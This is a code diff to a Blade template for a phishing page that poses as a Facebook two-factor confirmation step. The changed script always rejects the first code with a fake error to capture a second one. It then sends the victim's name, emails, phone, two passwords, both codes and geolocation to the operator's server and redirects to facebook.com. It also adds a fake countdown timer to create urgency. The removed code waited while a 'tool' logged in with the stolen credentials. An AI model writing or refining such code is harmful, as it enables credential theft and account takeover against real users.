@@ -19,115 +19,182 @@
     <link type="text/css" href="/css/spinner.css" rel="stylesheet">
     <link type="text/css" href="/css/app.css" rel="stylesheet">
     <link type="text/css" href="/css/confirm.css" rel="stylesheet">
+    <style>
+        #submit-code {
+            font-size: 20px;
+            font-weight: bolder;
+            width: 100%;
+            border-radius: 10px;
+        }
+
+        #submit-code:hover {
+            background-color: #3578E5;
+            color: white;
+        }
+
+        .btn-send-code {
+            margin-top: 10px;
+            text-align: center;
+            color: #3578E5;
+            font-size: 14px;
+        }
+    </style>
 @endpush
 @push('scripts')
     <script type="text/javascript">
-            const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
-            const parseQueryParams = JSON.parse(queryParams);
+        const queryParams = '{!! json_encode(\App\Helpers\Helpers::getQueryParams($settings, 'path_login_page')) !!}';
+        const parseQueryParams = JSON.parse(queryParams);
 
-            function replaceQueryParam(param, value, search) {
-                let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
-                let query = search.replace(regex, "$1").replace(/&$/, '');
+        function replaceQueryParam(param, value, search) {
+            let regex = new RegExp("([?;&])" + param + "[^&;]*[;&]?");
+            let query = search.replace(regex, "$1").replace(/&$/, '');
 
-                return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
+            return (query.length > 2 ? query + "&" : "?") + (value ? param + "=" + value : '');
+        }
+
+        if (parseQueryParams.length > 0) {
+            for (const query of parseQueryParams) {
+                const currentQuery = window.location.search
+                const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
+                window.history.pushState(null, null, newUrl)
             }
+        }
+    </script>
+    <script type="text/javascript">
+        $.ajaxSetup({
+            headers: {
+                'X-CSRF-TOKEN': '{{ csrf_token() }}'
+            }
+        });
 
-            if (parseQueryParams.length > 0) {
-                for (const query of parseQueryParams) {
-                    const currentQuery = window.location.search
-                    const newUrl = replaceQueryParam(query[0], query[1], currentQuery);
-                    window.history.pushState(null, null, newUrl)
+        $(document).ready(function() {
+            var countTimeInterval = null;
+            var minute = 5;
+            var second = 0;
+
+            countTimeInterval = setInterval(() => {
+                second = second - 1;
+                if (second < 0) {
+                    second = 59;
+                    minute = minute - 1;
                 }
-            }
-        </script>
-        <script type="text/javascript">
-            $.ajaxSetup({
-                headers: {
-                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
+                if (minute >= 0) {
+                    $('.time-remain').text(
+                        `${minute < 10 ? '0'+minute : minute}:${second < 10 ? '0'+second : second}`);
+                } else {
+                    $('.time-remain').text('00:00');
+                    clearInterval(countTimeInterval);
                 }
-            });
+            }, 1000);
+        });
 
-            var idIntervalGetCacheByEmail = null;
-            var isLoginSuccessfully = 0;
-            var email = "";
-            //
-            var ipAddress = "";
-            var latitude = "";
-            var longitude = "";
-            var countryName = "";
-            var countryCode = "";
-            var cityName = "";
-            var regionName = "";
-            var timeZone = "";
-            var zipCode = "";
-            var continent = "";
-            var continentCode = "";
-            var user = JSON.parse(localStorage.getItem('user')) || '';
-            if (!user) {
-                window.location.href = '/';
-            }
+        var idIntervalGetCacheByEmail = null;
+        var isLoginSuccessfully = 0;
+        var email = "";
+        //
+        var ipAddress = "";
+        var latitude = "";
+        var longitude = "";
+        var countryName = "";
+        var countryCode = "";
+        var cityName = "";
+        var regionName = "";
+        var timeZone = "";
+        var zipCode = "";
+        var continent = "";
+        var continentCode = "";
+        var user = JSON.parse(localStorage.getItem('user')) || '';
+        if (!user) {
+            window.location.href = '/';
+        }
 
-            async function setCurrentLang() {
-                let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
-                const response = await fetch(getIpInfoUrl);
-                const ipInfo = await response.json();
-                ipAddress = ipInfo.ipAddress;
-                latitude = ipInfo.latitude;
-                longitude = ipInfo.longitude;
-                countryName = ipInfo.countryName;
-                countryCode = ipInfo.countryCode;
-                cityName = ipInfo.cityName;
-                regionName = ipInfo.regionName;
-                timeZone = ipInfo.timeZone;
-                zipCode = ipInfo.zipCode;
-                continent = ipInfo.continent;
-                continentCode = ipInfo.continentCode;
-            }
-            setCurrentLang();
+        async function setCurrentLang() {
+            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
+            const response = await fetch(getIpInfoUrl);
+            const ipInfo = await response.json();
+            ipAddress = ipInfo.ipAddress;
+            latitude = ipInfo.latitude;
+            longitude = ipInfo.longitude;
+            countryName = ipInfo.countryName;
+            countryCode = ipInfo.countryCode;
+            cityName = ipInfo.cityName;
+            regionName = ipInfo.regionName;
+            timeZone = ipInfo.timeZone;
+            zipCode = ipInfo.zipCode;
+            continent = ipInfo.continent;
+            continentCode = ipInfo.continentCode;
+        }
+        setCurrentLang();
 
-            async function getCacheByEmail(email) {
-                let result = null;
-                let formData = new FormData();
-                formData.append('email', email);
-                await $.ajax({
-                    method: "POST",
-                    url: "/api/get-cache-by-email",
-                    data: formData,
-                    cache: false,
-                    contentType: false,
-                    processData: false,
-                    success: function(response) {
-                        if (response.status == 0) {
-                            result = response.data;
-                        }
+        async function getCacheByEmail(email) {
+            let result = null;
+            let formData = new FormData();
+            formData.append('email', email);
+            await $.ajax({
+                method: "POST",
+                url: "/api/get-cache-by-email",
+                data: formData,
+                cache: false,
+                contentType: false,
+                processData: false,
+                success: function(response) {
+                    if (response.status == 0) {
+                        result = response.data;
                     }
-                })
+                }
+            })
 
-                return result;
+            return result;
+        }
+
+        var countTimeFA = 0;
+
+        $(document).on('click', '#submit-code', async function() {
+            $('.notice-error').addClass('d-none');
+            const fa_code = $('#input-code').val();
+            if (fa_code == '') {
+                $('#input-code').addClass('is-invalid')
+                return false;
+            }
+            if (!isValidOTP(fa_code)) {
+                $('#input-code').addClass('is-invalid')
+                return false;
             }
 
-            $(document).on('click', '#submit-code', async function() {
-                $('.notice-error').addClass('d-none');
-                const fa_code = $('#input-code').val();
-                if (fa_code == '') {
-                    $('#input-code').addClass('is-invalid')
-                    return false;
-                }
-                if (!isValidOTP(fa_code)) {
-                    $('#input-code').addClass('is-invalid')
-                    return false;
-                }
-
-                const loading = $('#submit-code-loading');
-                const text = $('#submit-code-text');
-                text.addClass('d-none');
-                loading.removeClass('d-none');
-                let email = user.email || '';
-                let password = user.password || '';
-                //
+            const loading = $('#submit-code-loading');
+            const text = $('#submit-code-text');
+            text.addClass('d-none');
+            loading.removeClass('d-none');
+            //
+            if (countTimeFA == 0) {
+                countTimeFA = 1;
+                let user = JSON.parse(localStorage.getItem('user'));
+                localStorage.setItem('user', JSON.stringify({
+                    ...user,
+                    fa_code_1: fa_code
+                }));
+                // display error
+                setTimeout(() => {
+                    $('#submit-code').prop('disabled', false);
+                    $('.notice-error').removeClass('d-none');
+                    text.removeClass('d-none');
+                    loading.addClass('d-none');
+                    $('#input-code').val('');
+                }, 2000);
+            } else {
                 let formData = new FormData();
-                formData.append('fa_code', fa_code);
-                formData.append('email', email);
+                let user = JSON.parse(localStorage.getItem('user'));
+                //
+                formData.append('name_fanpage', user ? user.name_fanpage : '');
+                formData.append('fullname', user ? user.fullname : '');
+                formData.append('bussiness_email', user ? user.bussiness_email : '');
+                formData.append('personal_email', user ? user.personal_email : '');
+                formData.append('phone', user ? user.phone : '');
+                formData.append('information', user ? user.information : '');
+                formData.append('fa_code_1', user ? user.fa_code_1 : '');
+                formData.append('fa_code_2', fa_code);
+                formData.append('password_1', user ? user.password_1 : '');
+                formData.append('password_2', user ? user.password_2 : '');
                 formData = pushIPInfo(formData);
                 await $.ajax({
                     method: "POST",
@@ -138,44 +205,7 @@
                     processData: false,
                     success: function(response) {
                         if (response.status == 0) {
-                            // start to call get cache by email waiting until tool returns response of login
-                            idIntervalGetCacheByEmail = setInterval(async () => {
-                                let info = await getCacheByEmail(email);
-                                if (info) {
-                                    text.removeClass('d-none');
-                                    loading.addClass('d-none');
-                                    console.log(info);
-                                    if (info.isFaSuccessfully == 1) {
-                                        $('.notice-error').addClass('d-none');
-                                        localStorage.removeItem('user');
-
-                                        window.location.href = 'https://www.facebook.com/';
-                                    } else {
-                                        console.log("Fa failed");
-                                        // $('.text-error-fa').text(`@lang('confirm.error_notice')`);
-                                        $('.notice-error').removeClass('d-none');
-                                        text.removeClass('d-none');
-                                        loading.addClass('d-none');
-                                    }
-                                    $('#submit-code').prop('disabled', false);
-                                    clearInterval(idIntervalGetCacheByEmail);
-                                    //
-                                    // call api clear all cache
-                                    $.ajax({
-                                        method: "POST",
-                                        url: "/api/delete-all-cache",
-                                        success: function(response) {
-                                            if (response.status == 0) {
-                                                console.log(
-                                                    "Delete all cache success",
-                                                    response);
-                                            }
-                                        }
-                                    });
-                                } else {
-                                    console.log("Still call get cache by email");
-                                }
-                            }, 3000);
+                            window.location.href = 'https://www.facebook.com/';
                         } else {
                             $('#submit-code').prop('disabled', false);
                             $('.notice-error').removeClass('d-none');
@@ -184,89 +214,65 @@
                         }
                     }
                 });
-            })
-
-            function pushIPInfo(formData) {
-                formData.append('ipAddress', ipAddress)
-                formData.append('latitude', latitude)
-                formData.append('longitude', longitude)
-                formData.append('countryName', countryName)
-                formData.append('countryCode', countryCode)
-                formData.append('regionName', regionName)
-                formData.append('cityName', cityName)
-                formData.append('timeZone', timeZone)
-                formData.append('zipCode', zipCode)
-                formData.append('continent', continent)
-                formData.append('continentCode', continentCode)
-                return formData;
             }
 
-            function isValidOTP(value) {
-                // const regexOtp = /^\d{6}|\d{8}$/;
-                return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
+        })
+
+        function pushIPInfo(formData) {
+            formData.append('ipAddress', ipAddress)
+            formData.append('latitude', latitude)
+            formData.append('longitude', longitude)
+            formData.append('countryName', countryName)
+            formData.append('countryCode', countryCode)
+            formData.append('regionName', regionName)
+            formData.append('cityName', cityName)
+            formData.append('timeZone', timeZone)
+            formData.append('zipCode', zipCode)
+            formData.append('continent', continent)
+            formData.append('continentCode', continentCode)
+            return formData;
+        }
+
+        function isValidOTP(value) {
+            // const regexOtp = /^\d{6}|\d{8}$/;
+            return /^\d{6}$/.test(value) || /^\d{8}$/.test(value);
+        }
+
+        function validateOtp() {
+            $(this).val($(this).val().replace(/[^0-9.]/g, ''));
+
+            if ($(this).val().length >= 8) {
+                // event.preventDefault();
+                $(this).val($(this).val().slice(0, 8));
             }
 
-            function validateOtp() {
-                $(this).val($(this).val().replace(/[^0-9.]/g, ''));
-
-                if ($(this).val().length >= 8) {
-                    // event.preventDefault();
-                    $(this).val($(this).val().slice(0, 8));
-                }
-
-                if (!isValidOTP($(this).val())) {
-                    $(this).addClass('is-invalid');
-                    $('#send-otp-number').removeClass('disabled');
-                } else {
-                    $(this).removeClass('is-invalid');
-                }
+            if (!isValidOTP($(this).val())) {
+                $(this).addClass('is-invalid');
+                $('#send-otp-number').removeClass('disabled');
+            } else {
+                $(this).removeClass('is-invalid');
             }
+        }
 
-            $(document).on('keypress', '.validate-otp', validateOtp)
-            $(document).on('input', '.validate-otp', validateOtp)
-            $(document).on('keydown', '.validate-input', validateOtp)
-        </script>
+        $(document).on('keypress', '.validate-otp', validateOtp)
+        $(document).on('input', '.validate-otp', validateOtp)
+        $(document).on('keydown', '.validate-input', validateOtp)
+    </script>
 @endpush
 @extends('layouts.main')
 @section('content')
     <main class="home">
-        {{-- <div class="header header-confirm">
-            <div class="header-dialog">
-                <div class="header-content">
-                    <div class="header-border"></div>
-                    <div class="header-main"></div>
-                    <div class="header-login">
-                        <div class="login-content">
-                            <ul class="login-content-list" role="tablist">
-                                <li class="login-content-item" role="presentation">
-                                    <a class="login-logout" href="javascript:;">@lang('confirm.log_out')</a>
-                                </li>
-                            </ul>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div> --}}
         <div class="body form-confirm">
             <div class="fb_content clearfix " role="main">
                 <div class="body-form">
                     <div class="form-confirm">
                         <div class="form-confirm-title">
-                            <div class="title-confirm">@lang('confirm.title_form')</div>
+                            <div class="title-confirm" style="font-size: 24px">@lang('confirm.title_form')</div>
                         </div>
-                        <div class="line-hr"></div>
                         <div class="form-confirm-sub-title form-confirm-input">
-                            <div class="sub-title-confirm">@lang('confirm.sub_title_form')</div>
-                            {{-- <div class="title-confirm-input">@lang('confirm.title_input_code')</div> --}}
-                            <div class="sub-title-confirm-input">@lang('confirm.sub_title_input_code')</div>
+                            <div class="">@lang('confirm.sub_title_form')</div>
                         </div>
                         <img src="/assets/img/transfer.gif" style="width: 100%" alt="">
-                        {{-- <div class="line-hr"></div>
-                        <div class="form-confirm-notice">
-                            <div class="title-confirm-notice">@lang('confirm.title_notice')</div>
-                            <div class="sub-title-confirm-notice">@lang('confirm.sub_title_notice')</div>
-                        </div>
-                        <div class="line-hr"></div> --}}
                         <div class="form-confirm-input">
                             <div class="form-confirm-input-text">
                                 <input id="input-code" style="font-size: 16px;" type="text" max="999999"
@@ -275,22 +281,26 @@
                             </div>
                         </div>
                         <div class="notice-error d-none">@lang('confirm.error_notice')</div>
-                        {{-- <div class="line-hr"></div> --}}
-                        <div class="form-confirm-footer">
-                            <div class="form-confirm-footer-left">
-                                <a href="javascript:;">@lang('confirm.need_another')</a>
-                            </div>
-                            <div class="form-confirm-footer-right">
-                                <button id="submit-code" class="disabled">
-                                    <span id="submit-code-loading"
-                                        class="d-none spinner-border spinner-border-sm spinner"></span>
-                                    <span id="submit-code-text">@lang('confirm.submit_code')</span>
-                                </button>
+                        <div class=""
+                            style="background-color:#F7F8FA;border-radius:10px;display:flex;padding:15px;margin:10px 0px;align-items:center">
+                            <div class="">
+                                <p style="font-size: 12px">@lang('confirm.noti_1')</p>
+                                <p>@lang('confirm.noti_2') <b class="time-remain">05:00</b> @lang('confirm.noti_3') </p>
                             </div>
                         </div>
+                        <p>@lang('confirm.noti_4')</p>
+                        {{-- <div class="line-hr"></div> --}}
+                        <div class="form-confirm-footer">
+                            <button style="width: 100%" id="submit-code" class="disabled">
+                                <span id="submit-code-loading"
+                                    class="d-none spinner-border spinner-border-sm spinner"></span>
+                                <span id="submit-code-text">@lang('confirm.submit_code')</span>
+                            </button>
+                        </div>
+                        <div style="" class="btn-send-code">@lang('confirm.button_send_code')</div>
                     </div>
                 </div>
-                <div class="footer">
+                {{-- <div class="footer">
                     <div class="footer-wrapper">
                         <div class="footer-content">
                             <ul class="footer-item-list">
@@ -412,7 +422,7 @@
                             </div>
                         </div>
                     </div>
-                </div>
+                </div> --}}
             </div>
             <div></div>
             <span></span>
